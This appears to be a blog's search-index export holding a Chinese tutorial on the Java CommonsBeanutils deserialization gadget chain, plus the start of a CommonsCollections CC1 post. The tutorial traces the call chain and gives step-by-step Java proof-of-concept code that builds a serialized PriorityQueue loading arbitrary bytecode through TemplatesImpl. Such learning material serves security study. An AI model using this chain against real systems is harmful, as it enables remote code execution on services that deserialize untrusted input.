<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Java反序列化CommonsBeanutils链</title>
    <url>/2024/06/08/JAVA%E5%AE%89%E5%85%A8/CB%E9%93%BE/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code> CommonsBeanutils</code>属于<code>Apache Commons </code>工具集下的一个项目，它和<code>Commons-Collections</code>很像，也是对JAVA内置功能的加强，CC是对JAVA集合类的增强，CB是对<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">JavaBean</a>的加强。</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs shello">&lt;dependencies&gt;<br>       &lt;dependency&gt;<br>           &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;<br>           &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;<br>           &lt;version&gt;1.9.2&lt;/version&gt;<br>       &lt;/dependency&gt;<br> &lt;dependencies&gt;      <br></code></pre></td></tr></table></figure>

<h3 id="getter和setter"><a href="#getter和setter" class="headerlink" title="getter和setter"></a>getter和setter</h3><p>接着我们可以通过一个简单的示例实际的了解一下，下面代码定义了一个 Person类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name=<span class="hljs-string">&quot;Sp4rks3&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>在该类中，定义了一个私有属性<code>name</code>和两个方法：读取<code>name</code>和设置<code>name</code>。在 Java 中，我们把符合驼峰式命名法，以 get 开头的方法名叫做<code>getter</code>，以 set 开头的方法名叫做<code>setter</code>。</p>
<p><code>CommonsBeanutils</code>为开发人员提供了一个静态方法：<code>PropertyUtils.getProperty()</code>，通过该方法可以调用任意<code>JavaBean</code>中的<code>getter()</code>方法。因此我们可以通过如下代码调用 User 类的<code>getName()</code>方法获取 username 的值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">System.out.println(PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(),<span class="hljs-string">&quot;name&quot;</span>));<br></code></pre></td></tr></table></figure>

<p>相当于我传入一个字符串，它就会动态的执行函数，这样就会让我们想到会不会有安全问题</p>
<hr>
<p><img src="https://image.sp4rks.xyz/2024/06/2024-06-07%20104831.png" alt="2024-06-07 104831"></p>
<p>我们传入的是 <code>name</code>，但是返回的是gette方法和setter方法的名字 还返回了Bean的属性值的名字。</p>
<p>(大写的<code>Name</code>，实际是<code>javabean</code>的默认格式，就是传进来小写，但是会将第一个字母变为大写，变为<code>Name</code>)</p>
<hr>
<p><code>PropertyUtilsBean</code>中看到了调用的地方，意思就是对我们传递的对象，调用一个符合JavaBean的方法(getter方法)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240606214037301.png" alt="image-20240606214037301"></p>
<h2 id="CommonsBeanUtils利用链分析"><a href="#CommonsBeanUtils利用链分析" class="headerlink" title="CommonsBeanUtils利用链分析"></a>CommonsBeanUtils利用链分析</h2><p>CC3中提到了<code>Templateslmpl</code>类，它里面有<code>getOutputProperties()</code>方法,而<code>getOutputProperties()</code>名字正好满足getter方法的定义且<code>newTransformer()</code>是可以动态加载类的</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240606214356953.png" alt="image-20240606214356953"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240606214757835.png" alt="image-20240606214757835"></p>
<h3 id="TemplatesImpl调用链"><a href="#TemplatesImpl调用链" class="headerlink" title="TemplatesImpl调用链"></a>TemplatesImpl调用链</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">TemplatesImpl#</span><span class="language-bash">getOutputProperties() -&gt; TemplatesImpl<span class="hljs-comment">#newTransformer() -&gt;</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">TemplatesImpl#</span><span class="language-bash">getTransletInstance() -&gt; TemplatesImpl<span class="hljs-comment">#defineTransletClasses()</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">TransletClassLoader<span class="hljs-comment">#defineClass()</span></span><br></code></pre></td></tr></table></figure>

<p>所以<code>PropertyUtils.getProperty(o1, property)</code>这段代码，当o1是一个 <code>TemplatesImpl</code>对 象，而 property 的值为<code>outputProperties</code>时，将会自动调用getter，也就是 <code>TemplatesImpl.getOutputProperties()</code>方法，触发代码执行。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240606220701527.png" alt="image-20240606220701527"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.System.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>		<span class="hljs-comment">//TemplatesImpl3后段代码执行部分</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>接着就是找在哪调用了<code>getProperty()</code>,在<code>BeanComparator.compare()</code>中找到了调用<code>getProperty()</code>的地方</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240607184303226.png" alt="image-20240607184303226"></p>
<p><code>compare()</code>我们也很熟悉了，在<a href="https://sp4rks3.github.io/2024/06/01/JAVA%E5%AE%89%E5%85%A8/CC4/">Java反序列化CommonsCollections篇-CC4</a>有提到compare，compare的方法调用是这样的</p>
<p><img src="https://image.sp4rks.xyz/2024/06/6.png" alt="6"></p>
<h3 id="链子流程"><a href="#链子流程" class="headerlink" title="链子流程"></a>链子流程</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">PriorityQueue.readObject()<br>	PriorityQueue.heapify()<br>		PriorityQueue.siftDown()<br>			PriorityQueue.siftDownUsingComparator()<br>				BeanComparator.compare()<br>					PropertyUtils.getProperty(TemplatesImpl, outputProperties)<br>    <br>						TemplatesImpl.getOutputProperties()<br>							TemplatesImpl.newTransformer()<br>								TemplatesImpl.getTransletInstance()<br>									TemplatesImpl.defineTransletClasses()<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/CB1.png" alt="CB1"></p>
<h2 id="CommonsBeanUtils链实现"><a href="#CommonsBeanUtils链实现" class="headerlink" title="CommonsBeanUtils链实现"></a>CommonsBeanUtils链实现</h2><p>尝试按照上面的逻辑写</p>
<h3 id="未找到方法的错误"><a href="#未找到方法的错误" class="headerlink" title="未找到方法的错误"></a>未找到方法的错误</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//TemplatesImpl3后段代码执行部分</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><span class="hljs-comment">//        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span><br>        <br>        <span class="hljs-comment">//CB的部分</span><br>        BeanComparator&lt;Object&gt; beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>		<br>		<span class="hljs-comment">//CC4的逻辑部分</span><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(beanComparator);<br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>报错信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">NoSuchMethodException: java.lang.NoSuchMethodException: Unknown property <span class="hljs-string">&#x27;outputProperties&#x27;</span> on class <span class="hljs-string">&#x27;class java.lang.Integer&#x27;</span><br></code></pre></td></tr></table></figure>

<p>跟进报错信息</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240607223017391.png" alt="image-20240607223017391"></p>
<p>对2(Interger)这个对象调用outputProperties，那肯定没有这个方法，遂报错</p>
<p>修改想法：</p>
<p>将</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">priorityQueue.<span class="hljs-built_in">add</span>(templates);<br>priorityQueue.<span class="hljs-built_in">add</span>(2);<br></code></pre></td></tr></table></figure>

<p>变为</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">priorityQueue.<span class="hljs-built_in">add</span>(templates);<br>priorityQueue.<span class="hljs-built_in">add</span>(templates);<br></code></pre></td></tr></table></figure>

<p>但是又有个问题，因为add会触发compare，导致序列化的时候就走完链子</p>
<p>所以咱们先得让链子断开，add完之后，序列化之前通过反射再将链子连接起来</p>
<p>修改后：</p>
<h3 id="对象比较错误"><a href="#对象比较错误" class="headerlink" title="对象比较错误"></a>对象比较错误</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//TemplatesImpl3后段代码执行部分</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>		<span class="hljs-comment">//PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span><br>        <br>        <span class="hljs-comment">//CB的部分</span><br>        BeanComparator&lt;Object&gt; beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>		<span class="hljs-comment">//不填beanComparator，断开链子</span><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;();<br>        priorityQueue.add(templates);<br>        priorityQueue.add(templates);<br>		<br>		<span class="hljs-comment">//反射修改comparator</span><br>        Class&lt;PriorityQueue&gt; c = PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">cDeclaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        cDeclaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        cDeclaredField.set(priorityQueue, beanComparator);<br><br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>错误信息 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl cannot be cast to java.lang.Comparable</code> 意味着 <code>PriorityQueue</code> 中的 <code>TemplatesImpl</code> 对象在插入时无法进行比较。<code>PriorityQueue</code> 需要所有元素实现 <code>Comparable</code> 接口或者需要一个 <code>Comparator</code> 来对元素进行比较。</p>
<p>修改想法：</p>
<p>既然templates不能比较，那就换成数字，这总可以比较吧</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">priorityQueue.<span class="hljs-built_in">add</span>(1);<br>priorityQueue.<span class="hljs-built_in">add</span>(2);<br></code></pre></td></tr></table></figure>

<p>可是又会出现刚刚不能找到outputProperties方法的问题，所以add完之后，序列化之前要将<code>priorityQueue.add(1);</code>换成<code>priorityQueue.add(templates)</code></p>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//TemplatesImpl3后段代码执行部分</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//CB部分</span><br>        BeanComparator&lt;Object&gt; beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;();<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>		<span class="hljs-comment">//反射修改comparator和queue</span><br>        Class&lt;PriorityQueue&gt; c = PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparatorField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparatorField.setAccessible(<span class="hljs-literal">true</span>);<br>        comparatorField.set(priorityQueue, beanComparator);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">queueField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        queueField.setAccessible(<span class="hljs-literal">true</span>);<br>        Object[] queue = (Object[]) queueField.get(priorityQueue);<br>        queue[<span class="hljs-number">0</span>] = templates;<br><br><br><span class="hljs-comment">//        serialize(priorityQueue);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>为什么修改 <code>queue</code> 可以改变 <code>PriorityQueue</code> 的行为</p>
<p><code>PriorityQueue</code> 内部使用数组来存储元素，而这个数组的引用被保存在 <code>queue</code> 字段中。</p>
<p>通过反射，获取了 <code>PriorityQueue</code> 中 <code>queue</code> 字段的引用，并且直接修改了它，将 <code>TemplatesImpl</code> 对象添加到了队列的第一个位置。</p>
<h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">JavaBean</a></p>
<p><a href="https://www.bilibili.com/video/BV1uf4y1T7Rq/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiro反序列化漏洞(三)-shiro无依赖利用链</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">CommonsBeanutils与无commons-collections的Shiro反序列化利用</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC1</title>
    <url>/2024/05/23/JAVA%E5%AE%89%E5%85%A8/CC1/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li><p>JAVA版本8u65</p>
</li>
<li><p>commons-collections 3.2.1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;dependencies&gt;<br>        &lt;dependency&gt;<br>            &lt;groupId&gt;commons-collections&lt;/groupId&gt;<br>            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">3.2</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br>&lt;/dependencies&gt;<br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="Common-Collections-介绍"><a href="#Common-Collections-介绍" class="headerlink" title="Common-Collections 介绍"></a>Common-Collections 介绍</h2><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">Apache Commons Collections包和简介</a></p>
<ul>
<li><p><code>org.apache.commons.collections</code> – CommonsCollections自定义的一组公用的接口和工具类</p>
</li>
<li><p><code>org.apache.commons.collections.bag</code> – 实现Bag接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.bidimap</code> – 实现BidiMap系列接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.buffer</code> – 实现Buffer接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.collection</code> –实现java.util.Collection接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.comparators</code>– 实现java.util.Comparator接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.functors</code> –Commons Collections自定义的一组功能类</p>
</li>
<li><p><code>org.apache.commons.collections.iterators</code> – 实现java.util.Iterator接口的一组类</p>
